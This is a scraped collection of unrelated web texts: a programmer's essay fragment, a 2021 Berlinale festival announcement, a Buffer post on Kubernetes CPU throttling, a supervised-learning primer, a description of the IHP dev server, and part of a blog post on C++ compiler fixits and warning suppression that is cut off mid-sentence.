<p>There's the argument that programmers can't fully understand what's going on, what with all the APIs and layers and stuff. And if you don't understand your own environment, that's stressful and that's not fun. Fair enough; but again – who <em>does</em> understand his environment more than a programmer? A doctor digging into a patient's guts? A lawyer sifting through legal documents? An investor trading financial derivatives? A manager overseeing 10 or 20 programmers? With all the self-inflicted complexity, we're still in a better shape than most.</p>
<p>The fact is that there are relatively few programmers in their fifties around. Does it mean people don't survive in programming though? More likely, it is simply a result of growth. There were few 20 year old programmers 30 years ago – compared to 10 years ago. Therefore, there are fewer 50 year old programmers today than 30 year old programmers. To the extent that the growth in programming slows down, things will be different 20 years down the road.</p>
<p>So I'm not planning to quit programming, not because it's such a great source of joy by itself, but because it looks so good compared to just about anything else. Maybe not the most "passionate" statement – but passion burns out, whereas greed is sustainable. And if you plan to quit programming, I wonder what your alternative is, and I won't be surprised if you come back to programming in a few years.</p>

<h5>Competition | Generation | European Film Market &amp; Co-Production Market | Awards | Additional Information</h5>

</p>

<div>
<div><p>The Berlin International Film Festival has made its first decisions for the 2021 festival. The Berlinale 2021 is being planned as a physical festival. A hybrid model is intended for the <i>European Film Market</i> (<i>EFM</i>).<br>The implementation of the Festival and Market will take place in accordance with the then-applicable rules and regulations, thus ensuring the greatest possible security for all guests. Adjustments in the festival structure, the film programming and the total number of invited films will be defined by the festival management within the coming weeks.<br>Moreover, it has already been decided that in 2021 the section <i>Generation</i> will only show feature-length films with a running time of at least 60 minutes – and no short films – in its two competition programmes <i>Generation Kplus </i>and <i>Generation 14plus</i>.<br>The official film registration starts on September 1, 2020. You will then find the regulations on <a href="https://www.berlinale.de/en/home.html" title="" target="_self">www.berlinale.de</a>.</p>
<p>“Festivals and markets are places of encounter and communication. This applies to the public as well as to the industry. We see an important and unique feature of festivals in their lively relationship with the audience. In times of the corona pandemic, it has become even clearer that we still require analogue experience spaces in the cultural realm”, says the director duo of the Berlinale, Mariette Rissenbeek and Carlo Chatrian. “We are pleased that festivals with physically present audiences are slowly taking place again around the world, and we wish our colleagues much success.”</p>
<h3>2021: Performance Awards Gender-Neutral / New: Jury Prize</h3><p>The Berlinale has reorganised the prizes awarded by the International Jury in the <i>Competition</i>. For the first time, the performance awards will be defined in a gender-neutral way. Instead of the awards for the Best Actor and the Best Actress, a “Silver Bear for Best Leading Performance” and a “Silver Bear for Best Supporting Performance” shall each be awarded on a gender-neutral basis.</p>
<p>In addition thereto, the “Silver Bear Jury Prize” constitutes a further new awards category.</p>
<p>The former “Silver Bear Alfred Bauer Prize” was suspended in 2020 due to new findings about the position of the first Berlinale director, Alfred Bauer, under National Socialism, and this prize will no longer be awarded in the future. The evaluation of an external specialist historical study on Alfred Bauer will be available in late summer and then published.</p>
<p>The International Jury of the <i>Competition</i> will award the following eight prizes:</p>
<ul> <li>Golden Bear for Best Film (awarded to the film’s producers)</li><li>Silver Bear Grand Jury Prize</li><li>Silver Bear for Best Director</li><li>Silver Bear Jury Prize</li><li>Silver Bear for Best Leading Performance</li><li>Silver Bear for Best Supporting Performance</li><li>Silver Bear for Best Screenplay</li><li>Silver Bear for Outstanding Artistic Contribution</li> </ul><p>“We believe that not separating the awards in the acting field according to gender comprises a signal for a more gender-sensitive awareness in the film industry,” commented the director duo of the Berlinale.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>At Buffer, we’ve been using <a href="https://kubernetes.io/case-studies/buffer/">Kubernetes since 2016</a>.  We’ve been managing our k8s (kubernetes) cluster with <a href="https://kops.sigs.k8s.io/">kops</a>, it has about 60 nodes (on AWS), and runs about 1500 containers. Our transition to a micro-service architecture has been full of trial and errors. Even after a few years running k8s, we are still learning its secrets. This post will talk about how something we thought was a good thing, but ended up to be not as great as we thought: <strong>CPU limits</strong>.</p>
<h2 id="cpu-limits-and-throttling">CPU limits and Throttling</h2>
<p>It is s general recommendation to set CPU limits. <a href="https://cloud.google.com/blog/products/gcp/kubernetes-best-practices-resource-requests-and-limits">Google, among others, highly recommends it</a>. The danger of not setting a CPU limit is that containers running in the node could exhaust all CPU available. This can trigger a cascade of unwanted events such as having key Kubernetes processes (such as <code>kubelet</code>) to become unresponsive. So it is in theory a great thing to set CPU limit in order to protect your nodes.</p>
<p>CPU limits is the maximum CPU time a container can uses at a given period (100ms by default). The CPU usage for a container will never go above that limit you specified. Kubernetes use a mechanism called <a href="https://en.wikipedia.org/wiki/Completely_Fair_Scheduler">CFS Quota</a> to <strong>throttle</strong> the container to prevent the CPU usage from going above the limit. That means CPU will be artificially restricted, making the performance of your containers lower (and slower when it comes to latency).</p>
<h2 id="what-can-happen-if-we-dont-set-cpu-limits">What can happen if we don’t set CPU limits?</h2>
<p>We unfortunately experienced the issue. The <code>kubelet</code> , a process running on every node, and in charge of managing the containers (pods)  in the nodes became unresponsive. The node will turn into a <code>NotReady</code> state, and containers (pods) that were present will be rescheduled somewhere else, and create the issue in the new nodes. Definitely not ideal isn’t it?</p>
<h2 id="discovering-the-throttling-and-latency-issue">Discovering the throttling and latency issue</h2>
<p>A key metric to check when you are running container is the <code>throttling</code> . This indicate the number of time your container has been throttled. Interestingly, we’ve discovered a lot of containers having throttling no matter if the CPU usage was near the limits or not. Here the example of one of our main API:</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/cpu-usage-limits.png" alt="Kubernetes pods CPU usage and limits"></p>
<p>You can see in the animation that the CPU limits is set at <code>800m</code> (0.8 core, 80% of a core), and the peak usage is at most <code>200m</code> (20% of a core). After seeing, we might think we have plenty of CPU to let the service running before it throttle right? . Now check this one out:</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/cpu-throttling-low-usage.gif" alt="Kubernetes pods Low CPU usage, High limit, lot of throttling"></p>
<p>You can notice the CPU throttling occurs, even though the CPU usage is below the CPU Limits. The maximum CPU usage isn’t even near the CPU limits.</p>
<p>We’ve then found a few resources(<a href="https://github.com/kubernetes/kubernetes/issues/67577">github issue</a>, <a href="https://www.youtube.com/watch?v=LpFApeaGv7A&amp;feature=youtu.be&amp;t=1204">zanado talk</a>,  <a href="https://medium.com/omio-engineering/cpu-limits-and-aggressive-throttling-in-kubernetes-c5b20bd8a718">omio post</a>) talking about how throttling lead to poorer performances and latency for your services.</p>
<p><strong>Why do we see CPU throttling while CPU usage is low?</strong>
The tldr is basically a bug in the Linux kernel throttling unecessarly containers with CPU limit. If you’re curious about the nature of it, I invite you to check Dave Chiluk’s <a href="https://www.youtube.com/watch?v=UE7QX98-kO0">great talk</a>, a <a href="https://engineering.indeedblog.com/blog/2019/12/unthrottled-fixing-cpu-limits-in-the-cloud/">written version</a> also exists with more details.</p>

<p>After many long discussions, we’ve decided to remove the CPU limits for all services that were directly or indirectly on the critical path of our users.</p>
<p>This wasn’t an easy decision since we value the stability of our cluster. We’ve experimented in the past some instability in our cluster with services using too much resources and disrupting all other services present in the same node.  That time was a bit different, we understood more about how our services needed to be and had a good strategy to roll this out.</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/unleash-k8s.jpg" alt="Buffer-remove-cpu-limits-announcement"></p>
<h2 id="how-to-keep-your-nodes-safe-when-removing-limits-">How to keep your nodes safe when removing limits ?</h2>
<p><strong>Isolating “No CPU Limits” services:</strong></p>
<p>In the past we’ve seen some nodes going to a <code>notReady</code> state, mainly because some services were using too much resources in a node.</p>
<p>We’ve decided to put those services on some specific nodes (tainted nodes), so those services will not disrupt all the “bounded” ones.  We have better control and could identify easier if any issue occurs with a node. We did this by tainting some nodes and adding toleration to services that were “unbounded”. Check <a href="https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/">the documentation</a> on how you can do that.</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/buffer-k8s-infrastructure-nodes.jpg" alt="Buffer k8s nodes infrastructure"></p>
<p><strong>Assigning the correct CPU and memory request:</strong></p>
<p>The main worry we had was service using too much resources and leading to nodes becoming unresponsive. Because we now had great observability of all services running in our cluster (with Datadog), I’ve analyzed a few months of usage of each service we wanted to “unbound”. I’ve assigned the maximum CPU usage as the CPU request with a &gt; 20% margin. This will make sure to have allocated space in a node. If k8s won’t try to schedule any other service in that node.</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/choose-cpu-request-based-on-max.png" alt="Chose CPU request based on max"></p>
<p>You can see in the graph that the peak CPU usage was <code>242m</code> CPU core (0.242 CPU core). Simply take this number and make it a bit higher to become the CPU request. You can notice that since the service is user facing, the peak CPU usage matches peak traffic time.</p>
<p>Do the same with your memory usage and requests, and you will be all set!
To add more safety, you can use the horizontal pod autoscaler to create new pods if the resource usage is high, so kubernetes will schedule it in nodes that have room for it. Set an alert if your cluster do not have any room, or use the node austoscaler to add it automatically.</p>
<p>The downsides are that we lose in “<a href="https://wiki.openvz.org/WP/Containers_density">container density</a>”, the number of containers that can run in a single node. We could also end up with a lot of “slack” during a low traffic time.
You could also hit some high CPU usage, but nodes autoscaling should help you with it.</p>
<h2 id="results">Results</h2>
<p>I’m happy to publish really great results after few weeks of experimentation, we’ve already seen really great latency improvements across all the services we’ve modified:</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/speedup-no-cpu-limits2.png" alt="faster-kubernetes-containers"></p>
<p>The best result happened on our main landing page (<a href="https://buffer.com/">buffer.com</a>) where we speed the service up to <strong>22x</strong> faster!</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/no-cpu-limit-speedup-buffer-com.jpg" alt="buffer.com speedup without cpu limits"></p>
<h2 id="is-the-linux-kernel-bug-fixed">Is the Linux kernel bug fixed?</h2>
<p>The bug <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=763a9ec06c4">has been fixed and merged into the kernel</a> for Linux distribution running 4.19 or higher (kudo again to <a href="https://twitter.com/dchiluk">Dave Chiluk</a> for finding and fixing that).</p>
<p>However, as for <em>September 2nd 2020</em>, when reading <a href="https://github.com/kubernetes/kubernetes/issues/67577">the kubernetes issue</a>, we can see various Linux projects that keep referencing the issue, so I guess some Linux distribution still have the bug and working into integrating the fix.</p>
<p>If you are below a Linux distribution that has a kernel version below 4.19, I’d recommend you to upgrade to the latest Linux distribution for your nodes, but in any case, you should try removing the CPU limits and see if you have any throttling.  Here a non exhausting list of various managed Kubernetes services or Linux distribution:</p>
<ul>
<li>Debian: The latest version <a href="https://erickhun.com/posts/kubernetes-faster-services-no-cpu-limits/%5Bhttps://www.debian.org/releases/buster/">buster</a> has the fix,  it looks <a href="https://tracker.debian.org/news/1167353/accepted-linux-latest-419-105deb10u5deb9u1-source-amd64-into-oldstable-oldstable/">quite recent (august 2020)</a>. Some previous version might have get patched</li>
<li>Ubuntu: The latest version <a href="https://releases.ubuntu.com/20.04/">Ubuntu Focal Fosa 20.04</a> has the fix.</li>
<li>EKS has the fix since <a href="https://github.com/aws/containers-roadmap/issues/175">December 2019</a>. Upgrade your AMI if you have a version below than that</li>
<li>kops: Since <a href="https://github.com/kubernetes/kops/pull/9283">June 2020</a>,  <code>kops 1.18+</code> will start using <code>Ubuntu 20.04</code> as the default host image. If you’re using a lower version of kops, you’ll have to probably to wait the fix. We are currently in this situation.</li>
<li>GKE (Goggle Cloud) : The kernel fix was merged in <a href="https://cloud.google.com/container-optimized-os/docs/release-notes#cos-stable-77-12371-141-0">January 2020</a>. But it does looks like throttling are <a href="https://news.ycombinator.com/item?id=24356903">still hapenning</a></li>
</ul>
<p>ps: Feel free to <a href="https://news.ycombinator.com/item?id=24351566">comment</a> if you have more precise information, I’ll update the post accordingly</p>
<p><strong>If the fix solved the throttling issue?</strong></p>
<p>I’m unsure if totally solved the issue. I will give it a try once we hit a kernel version where the fix has been implemented and will update this post accordingly. If anyone have upgrade I’m keen to hear their results.</p>
<h2 id="takeaways">Takeaways</h2>
<ul>
<li>If you run Docker containers under Linux (no matter Kubernetes/Mesos/Swarm) you might have your containers underperforming because of throttling</li>
<li>Upgrade to the latest version of your distribution hoping the bug is fixed</li>
<li>Removing CPU limit is a solution to solve this issue, but this is dangerous and should be made with extra-care (prefer upgrading your kernel first and monitor throttling first)</li>
<li>If you remove CPU limits, carefully monitor CPU and  memory usage in your nodes, and make sure your CPU requests are</li>
<li>A safe way to is to use the Horizontal pod autoscaler to create new pods if the resource usage is high, so kubernetes will schedule it in nodes that have space.</li>
</ul>
<p>👉<strong>Hacker news update: lot of insighful <a href="https://news.ycombinator.com/item?id=24351566">comments</a>. I’ve updated the post to have better recommendations. You should prefer upgrading your kernel version over removing the CPU limits. Be really mindful, set the proper CPU requests, add the necessary monitoring when you do this</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<!--kg-card-begin: markdown--><p>Supervised learning is perhaps the most common form of machine learning task in use nowadays.</p>
<p>This form of learning makes use of a labeled training dataset to create a model that predicts a target of interest. If this line makes absolutely no sense to you, don't worry. After reading this article you will have a clear understanding of supervised learning and its two most popular applications: regression and classification.</p>
<h2 id="trainingmachineswithexamples">Training machines with examples</h2>
<p>Supervised learning is a process in which you teach a machine to predict a particular result by feeding it examples 'with the right answers'.</p>
<p>The first thing you need to know is what are you trying to predict. You might want to create a program that classifies pet photos as <em>dog photos</em> or <em>cat photos</em>, or a program that predicts the prices of houses in different districts in Sydney, Australia.</p>
<p>After deciding the variable you are trying to predict (your <strong>target</strong>), it's time to gather data examples from the real world and <em>label them</em>. In our first example, we would start gathering photos with dogs and photos with cats and tagging them with the right category. This photo of a puppy is a dog photo, that photo of a cat playing with a laser is a cat photo, and so on for every example.</p>
<p>Before the training stage, you will set aside a percentage of your training set to test the performance of your models. Afterwards, you will feed your labeled examples into an algorithm that will learn to generalize a relationship between the inputs (the photos) and the targets (dog/cat), producing a model you can use to classify fresh images it has never seen before. In this context, this is what <em>training</em> means: teaching a machine to perform actions learned from training data.</p>
<p>You can evaluate how well the model performs on your training set, the one you put aside before training. If the results are satisfying, you can deploy the model into production and use it to solve the original problem. The following diagram shows a high-level view of the supervised learning process.</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/SupervisedLearning.png" alt="SupervisedLearning"></p>
<p>This is an example of a classification task.</p>
<p><strong>Classification</strong> and <strong>regression</strong> are the most common applications of supervised learning. If you are interested in a career in machine learning you will likely spend most of your time creating these types of models, so let's take a look at them.</p>
<h2 id="classifyingtheworld">Classifying the world</h2>
<p>A classifier is a model that tells you the <strong>class</strong>(category) an instance of your data belongs to. In the previous example, our instances were photos of pets, and the classes were <em>cat photos</em> and <em>dog photos</em>.</p>
<p>The training set for classification tasks is usually a collection of instances (individual instances of the phenomenon you are trying to model) with a <em>label</em> that specifies the class they belong to.</p>
<p>Classifiers can be further classified ( ͡° ͜ʖ ͡° ) into different subtypes depending on the number of target classes (binary or multiclass) and how many categories an instance can belong to at the same time (single-label and multi-label), let's take a look at those.</p>
<h4 id="binaryclassifiers">Binary classifiers</h4>
<p>A binary classifier is a model that classifies examples into two possible classes. Classifiers are capable of telling you if an email is either <strong>spam</strong> or <strong>not spam</strong>, if a photo of a face is <strong>happy</strong> or <strong>sad</strong> or if a substance is <strong>harmless</strong> or <strong>dangerous</strong>.</p>
<p>The most common setup for binary classification is to have a positive class (<em>class</em>) and a negative class (<em>not-class</em>). In this sense, you can re-define the previous examples as spam/not-spam, happy/not-happy and dangerous/not-dangerous.</p>
<p>Some types of binary classifiers don't just tell you a result, but they also provide you a probability that the instance you are classifying belongs to the predicted class.</p>
<p>Binary classifiers are some of the most studied and used models in machine learning, and many other models build on top of them (like some forms of multiclass classifiers).</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/BinaryClassifier.png" alt="BinaryClassifier"></p>
<h4 id="multiclassclassifiers">Multiclass classifiers</h4>
<p>As you might imagine from the title, a multiclass classifier is a model that classifies instances into many categories. Like in the previous case you can get the results as the probability of belonging to a particular class.</p>
<p>It's important to note that there is a difference depending on the number of classes an instance can belong to at the same time.</p>
<p>If the classes are mutually exclusive (an object can only belong to one class at a time) you are building a <strong>single-label multiclass classifier</strong>. If an instance can belong to more than 1 class at the same time then you need a <strong>multi-label classifier</strong>.</p>
<p>Depending on the particular scenario, your choice of algorithms and evaluation methods will differ.</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/MulticlassClassifier.png" alt="MulticlassClassifier"></p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/MultilabelClassifier.png" alt="MultilabelClassifier"></p>
<h2 id="regression">Regression</h2>
<p>The goal of a regression model is to predict a continuous value. The training set for a regression problem is usually a collection of instances with the associated numeric value you are trying to predict.</p>
<p>The following are some examples of regression problems</p>
<ul>
<li>Predict the price of houses in Amsterdam given the size of the house (in square meters), the year the house was built, the average income of the area in which the house is located, the number of bedrooms and the color of the mailbox.</li>
<li>Predict a person's likelihood developing diabetes given the height, weight, number of cigarettes smoked per day, average caloric intake, average hours of physical activity per week and amount of carbs consumed per day.</li>
<li>Predict the stock price of a company one year from now based on the number of Disney films released last year, the color of underwear the CEO wears with more frequency and the title of his/her aunt's favorite song.</li>
</ul>
<p>Regression tasks are extremely common in machine learning. If you decide to pursue a career in data science or ML engineering, many of the models you'll build are likely aimed to solve regression problems.</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/SimpleRegressor.png" alt="SimpleRegressor"></p>
<h2 id="thecoreassumptionofsupervisedlearning">The core assumption of supervised learning</h2>
<p>Ok, now you have an idea of what supervised learning is and how the process works. In brief, you collect a lot of data relevant to the problem you are trying to solve and label it with the <em>correct answers</em>, or the expected result your model is trying to predict. Then, all this training data is fed into an algorithm that will generate a model that maps the inputs into classes(classification) or values(regression).</p>
<p>For this process to work, the information contained in the training set needs to have enough <strong>predictive power</strong> for the algorithm to find a correlation between the two sets.</p>
<p>For example, if you want to predict the likelihood a given person has to develop diabetes, you might want data like the BMI, genetic predisposition and dietary habits. All 3 with powerful correlation with the variable you are trying to find (likelihood to develop a disease, in this case). Other data, like favorite film, shoe size, and favorite headphone brand has less predictive power for this particular target, so it makes little sense to add it to the training set.</p>
<p>Sometimes, the data gathered doesn't provide enough information to build a model that performs well, in this scenario you need to reformulate the problem or find data with better quality.</p>
<p>Supervised learning is a huge topic with lots of important concepts. The goal of this article was to present a high-level view of the topic. Hopefully, by now you have a better understanding of supervised learning, and we will be prepared to dig deeper in more elaborate topics in future articles.</p>

            <ul>
                <li>
                    <strong>Starting an IHP app</strong>

                    <p>
                        Let's first take a look at what happens when you start your IHP app by running <code>./start</code>.
                    </p>

                    <p>
                        The <a href="https://github.com/digitallyinduced/ihp-boilerplate/blob/master/start" target="_blank"><code>./start</code></a> script in your project is basically just a small wrapper that makes sure that all dependencies that are managed by nix are available and then calls the <code>RunDevServer</code> binary. <a href="https://github.com/digitallyinduced/ihp/blob/master/IHP/IDE/DevServer.hs" target="_blank">This binary is part of IHP</a> and does the actual application startup as well as managing the postgres server.
                    </p>

                    <p>
                        You can think of <code>RunDevServer</code> as a small process manager. When <code>RunDevServer</code> is started, it will directly start all processes required for your application to run:
                        </p><ul>
                            <li>the web-based IDE</li>
                            <li>a status server on port 8000 showing the compiler status and possible type errors</li>
                            <li>a websocket server used for communicating file changes for live reloading</li>
                            <li>a ghci (the standard haskell REPL) where it directly loads your app</li>
                            <li>a postgres server bound to unix socket</li>
                            <li>a file watcher to track haskell and css file changes</li>
                        </ul>
                    

                    <p>
                        All these processes are started in parallel for fast performance and synchronised in the main event loop of the dev server. Made possible thanks to haskells great concurrency capabilities.
                    </p>

                    <p>
                        The most important process is the ghci process with your app. Instead of fully recompiling your app on every file change, IHP loads your app in the repl and then refreshes only the changed files. 
                    </p>

                    <p>
                        At first ghci needs a couple of seconds to load all haskell files of your application. While loading your application the status server is serving all http requests on localhost:8000. The status server will also show all type errors in case ghci failed to load your app. When the ghci finished loading, the status server is stopped and your application is started on localhost:8000.
                    </p>

                </li>

                <li>
                    <strong>Haskell File Changes</strong>

                    <p>
                        <iframe width="100%" height="500" src="https://www.youtube.com/embed/nTjjDo57B8g" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
                    </p>

                    <p>
                        Once your application is started, the dev server mainly deals with file changes. Using a file watcher the dev server is notified about any changes to your haskell files in your project. When a haskell file is changed the app process running in the ghci process is stopped and a refresh (<code>:r</code>) is triggered. The refresh is usually very fast. Once completed the app server will be started again.
                    </p>

                    <p>
                        Once the haskell app has started, open browser pages will be notified using a websocket connection. The open pages will fetch the current page via ajax and will then update the dom using <a href="https://github.com/patrick-steele-idem/morphdom" target="_blank">a diff and patch approach</a>. So only dom nodes that have actually changed will be touched during the live reloading. This approach will keep existing page state like scroll position or text typed into a form field. It allows for a very fast and productive feedback cycle.
                    </p>

                        IHP also supports live reloading of CSS files. Once IHP sees a file change to your CSS files in the <code>static</code> directory it will notify all open browser tabs using its websocket connection. Once notified in the browser IHP will look for any <code>&lt;link rel="stylesheet"&gt;</code> and <a href="https://github.com/digitallyinduced/ihp/blob/master/lib/IHP/static/livereload.js#L68" target="_blank">will reload the css file using a cache buster</a>.

                        This is only possible because nix allows us to pin down the set of package definitions to a specific git commit of the nix package registry.

                    <p>
                        Sometimes you make a change which will stop your application from compiling. In these error cases the status server jumps in and starts listening on localhost:8000. The status server will then display the error message so you can quickly fix it:
                    </p>

                    <p>
                        Additionally open browser tabs will be notified about this and will refresh. This way the error is instantly visible to you.

                    <strong>Batteries-included</strong>

                    <p>
                        While the above steps are technically complicated, when doing actual development you will not see much of this complexity.  Lots of time have been spent to find the best approach and smoothing out all the edge cases. The whole process is very much inspired by PHP where you just make file changes and it works. The live reloading really <q>just works</q>.
                    </p>

                    <p>
                        The dev server is the heart of IHP and makes the dev process extremely productive. You get all the benefits of type-safety with the development speed you previously only got with scripting languages. If you haven't already it's time to try it out! 🚀

September 2, 2020 | https://quuxplusone.github.io/blog/2020/09/02/wparentheses/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2020/09/02/wparentheses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Today I finally write down some musings on two peripheral aspects of
compiler diagnostic design that I think are very important for certain kinds of warnings.
My first musing relates to <em>fixits</em>, and my second to <em>suppression mechanisms</em>.</p>

<h2 id="what-is-a-fixit">What is a fixit?</h2>

<p>Most C++ compilers these days don’t just tell you <em>that</em> a problem occurred
(like <a href="https://www.gnu.org/fun/jokes/ed-msg.txt"><code>ed</code>’s famous <code>?</code> prompt</a>),
and <em>what</em> the problem is (“expected identifier,” for example).
They’ll try to tell you <em>how to fix</em> the problem.</p>

<p>Compare GCC 4.1’s error messages with GCC 4.6’s. (<a href="https://godbolt.org/z/KM8P9E">Godbolt.</a>)
For this input:</p>



<p>GCC 4.1 complains merely that you have put <code>multiple types in one declaration</code>.
GCC 4.6 more helpfully complains that it <code>expected ';' after struct definition</code>,
and points to the exact position where it believes a semicolon should be inserted.</p>

<p>GCC 7 goes even further, and suggests a <em>fixit</em> — a machine-readable “spellcheck suggestion”
that some IDEs are able to apply with a single click.</p>

<div><div><pre><code>test.cc:1:12: error: expected ';' after struct definition
 struct S {}
            ^
            ;
</code></pre></div></div>

<p>In medical terms, the compiler has gone from simply detecting the <em>symptom</em>
(“this declaration seems to contain two types, which isn’t valid C++”)
to producing a <em>diagnosis</em> of the disease (“I bet you forgot a semicolon somewhere”);
and a compiler that supports fixits is actually <em>prescribing a treatment plan</em>.
Each of these steps is a quantum leap beyond the previous one in terms of both user-friendliness
and implementation complexity.</p>

<h2 id="what-is-a-suppression-mechanism">What is a suppression mechanism?</h2>

<p>Suppression mechanisms relate to compiler <em>warnings</em>, not compiler errors.
Consider the following snippet (<a href="https://godbolt.org/z/fTnao9">Godbolt</a>):</p>

<div><div><pre><code>if (argc = 1)
    puts("hello");
</code></pre></div></div>

<p>Every mainstream compiler warns on this suspicious-looking code (GCC and Clang with <code>-Wall</code>; MSVC with <code>-W4</code>).
Here’s GCC’s diagnostic:</p>

<div><div><pre><code>warning: suggest parentheses around assignment used as truth value [-Wparentheses]
    4 |     if (argc = 1)
      |         ~~~~~^~~
</code></pre></div></div>

<p>Notice that GCC doesn’t even bother to explain really what its diagnosis is;
it emits a passive-aggressive warning message that does nothing more than suggest how to
shut itself up!</p>

<p>The diagnosis, of course, is that frequently people mean to write <code>if (argc == 1)</code>
but their finger slips and they write <code>if (argc = 1)</code> instead, which unfortunately
is also valid C++ code. Every mainstream compiler has evolved the same way to deal with this:
if you really mean <code>=</code>, then you write an extra pair of parentheses around the expression, like so:</p>



<p>The extra pair of parentheses is what I’m calling a “suppression mechanism.”
It’s just an arbitrary way of silencing a warning diagnostic — telling the compiler
“no, I really <em>meant</em> to write this legal but unusual construct.”</p>

<p>Another well-known suppression mechanism is writing <code>(void)</code> in front of unused results
to silence <code>-Wunused-value</code> and <code>-Wunused-result</code> warnings (<a href="https://godbolt.org/z/WdrhrE">Godbolt</a>):</p>

<div><div><pre><code>[[nodiscard]] int foo();
void test(int x) {
    (void)x;
    (void)foo();
}
</code></pre></div></div>

<p>And a trivial suppression mechanism is implied by the name of the <code>-Wparentheses</code> warning:</p>

<div><div><pre><code>warning: '&amp;&amp;' within '||' [-Wlogical-op-parentheses]
    return (a &amp;&amp; b || c);
            ~~^~~~ ~~
</code></pre></div></div>

<p>Here the compiler just wants you to add a pair of parentheses to clarify the precedence for the reader.</p>

<h2 id="musing-a-single-fixit-must-preserve-actual-behavior-or-likely-intent-but-cant-do-both">Musing: A single fixit must preserve (actual) behavior or (likely) intent, but can’t do both</h2>

<p>It’s easy for the programmer to “fix” diagnostics like <code>-Wunused-result</code> and <code>-Wlogical-op-parentheses</code>,
because they’re just asking the programmer to clarify intent that is already pretty clear:
<em>Yes</em>, I mean to discard this result. <em>Yes</em>, I mean to evaluate <code>(a &amp;&amp; b) || c</code>.</p>

<p>The more interesting diagnostics are the ones where the compiler believes it has identified a mismatch
between the code’s actual <em>behavior</em> and the programmer’s <em>intent</em>. Our <code>if (argc = 1)</code> example
above was like that. A more realistic example might be something like</p>



<p>Here it is almost certain that the programmer intended to write</p>



<p>However, the literal behavior of the code as written is equivalent to</p>



<p>When the compiler suggests a fixit for this warning, it has to choose: Should we suggest the fix
that changes the behavior of the code to what you probably meant to type — the “spellcheck” option?
Or should we show how to silence the warning while preserving the existing code’s behavior — the
“Add To Dictionary” option, if you will? (Or, continuing our medical analogy, there’s the “treatment”
option and the “<a href="https://en.wikipedia.org/wiki/Do_not_resuscitate">DNR</a>” option.)</p>

<p>Showing just the “treatment” option puts the compiler in the awkward position of “recommending” that you change
the behavior of code that is, after all, perfectly legal C++ already; blindly applying the fixit to
working code might break that code. But showing just the “suppression” option might encourage a programmer to
blindly apply the fixit to <em>broken</em> code, thus leaving the bug in place but making it harder to detect
in the future.</p>

<p>For certain kinds of warnings, Clang shows <em>both</em> fixits. Two examples of this in Clang 10
are (<a href="https://godbolt.org/z/aWf9s6">Godbolt</a>):</p>

<div><div><pre><code>warning: using the result of an assignment as a condition without parentheses [-Wparentheses]
    if (x = foo())
        ~~^~~~~~~
note: place parentheses around the assignment to silence this warning
    if (x = foo())
          ^
        (        )
note: use '==' to turn this assignment into an equality comparison
     if (x = foo())
          ^
          ==
</code></pre></div></div>

<p>and</p>

<div><div><pre><code>warning: &amp; has lower precedence than !=; != will be evaluated first [-Wparentheses]
    return (foo() &amp; mask != 0);
                  ^~~~~~~~~~~
note: place parentheses around the '!=' expression to silence this warning
    return (foo() &amp; mask != 0);
                  ^
                    (        )
note: place parentheses around the &amp; expression to evaluate it first
    return (foo() &amp; mask != 0);
                  ^
            (           )
</code></pre></div></div>

<p>Notice that in both cases, Clang decides to print the “suppression” option first
and the “treatment” option second.
But sometimes Clang prints the “treatment” option first and the “suppression” option second:</p>

<div><div><pre><code>warning: size argument in 'strncmp' call is a comparison [-Wmemsize-comparison]
    return strncmp(a, b, len &lt; 0);
                         ~~~~^~~
note: did you mean to compare the result of 'strncmp' instead?
    return strncmp(a, b, len &lt; 0);
           ^                    ~
                            )
note: explicitly cast the argument to size_t to silence this warning
    return strncmp(a, b, len &lt; 0);
                         ^
                         (size_t)( )
</code></pre></div></div>

<p>and</p>

<div><div><pre><code>warning: logical not is only applied to the left hand side of this comparison [-Wlogical-not-parentheses]
    return x == y &amp;&amp; !x == z;
                     ^  ~~
note: add parentheses after the '!' to evaluate the comparison first
    return x == y &amp;&amp; !x == z;
                     ^
                      (     )
note: add parentheses around left hand side expression to silence this warning
    return x == y &amp;&amp; !x == z;
                     ^
                     ( )
</code></pre></div></div>

<p>Of course, there are many more cases where Clang emits <em>only</em> the “suppression” option
as a fixit, leaving the programmer to figure out the “treatment” on their own. (GCC 10.2
emits a fixit for only the last of these four examples; and it’s the “suppression” option.)</p>

<p>Even in the absence of any machine-readable fixits, the phrasing of the warning message
itself can induce the human reader to think in terms of suppression or in
terms of treatment. A warning message can be phrased as “Please confirm that you meant X”;
or “You did X; did you mean Y?”; or even as “Your attempt to do Y failed.”</p>

<h2 id="musing-suppression-mechanisms-are-about-edit-distance-and-about-signaling">Musing: Suppression mechanisms are about edit distance, and about signaling</h2>

<p>Compiler warnings of the kind we’re discussing here are basically of the form
“You wrote X, but I think you meant Y.” This happens only when X and Y are
in some sense <em>close together</em>. Sometimes the “closeness” is semantic, not syntactic
(as when the programmer means to invoke copy elision but writes <code>return std::move(x)</code> instead).
But for our purposes today, let’s just think about <em>syntactic</em> closeness. You meant
to write Y, but a minor typographical slip caused you to write X. In the examples above,
the slips are things like “omit one <code>=</code>,” or “omit a pair of parens” or
“put <code>&lt; 0</code> inside the parens instead of outside.”</p>

<p>Take X=”equality-compare <code>!a</code> to <code>b</code>” and Y=”negate the sense of <code>a == b</code>.”
